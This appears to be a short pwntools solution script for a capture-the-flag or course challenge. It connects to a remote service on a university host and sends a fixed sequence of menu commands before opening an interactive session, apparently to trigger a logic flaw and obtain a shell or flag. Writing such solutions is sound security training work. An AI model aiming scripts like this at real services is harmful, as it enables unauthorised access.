from pwn import *

port = 10038
rem = remote("kayle.snu.ac.kr", port)

sleep(9)
rem.sendlineafter(b"command: ", b"4")

for i in range(20):
  rem.sendlineafter(b"command: ", b"3")
  
rem.sendlineafter(b"command: ", b"5")
rem.sendlineafter(b"command: ", b"6")
rem.sendlineafter(b"command: ", b"5")

rem.interactive()